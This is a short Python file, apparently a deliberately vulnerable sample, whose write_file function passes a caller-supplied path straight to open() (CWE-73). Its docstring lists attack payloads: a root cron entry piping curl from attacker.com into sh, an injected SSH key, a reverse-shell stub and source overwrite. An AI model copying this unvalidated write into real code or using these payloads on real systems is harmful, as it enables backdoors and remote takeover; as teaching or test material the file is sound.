"""
Arbitrary File Write — CWE-73: External Control of File Name or Path.

The path parameter is passed directly to open() with no validation.
An attacker can write to any location the process can reach.
"""


def write_file(path: str, content: str) -> str:
    """Write content to a file at the given path.

    VULNERABLE: no path validation — writes to any accessible location.

    Overwrite cron job (as root):
        path=/etc/cron.d/backdoor  content=* * * * * root curl http://attacker.com/sh | sh

    Add SSH key:
        path=/root/.ssh/authorized_keys  content=ssh-rsa AAAA... attacker@host

    Create a Python reverse shell in /tmp:
        path=/tmp/shell.py  content=import socket,subprocess,os; ...

    Overwrite this server's own source:
        path=/app/server.py  content=<malicious server>
    """
    try:
        with open(path, "w") as fh:
            fh.write(content)
        return f"Written {len(content)} bytes to {path}"
    except PermissionError:
        return f"Permission denied: {path}"
    except FileNotFoundError:
        return f"No such directory: {path}"
    except Exception as exc:
        return f"Error writing to {path}: {exc}"
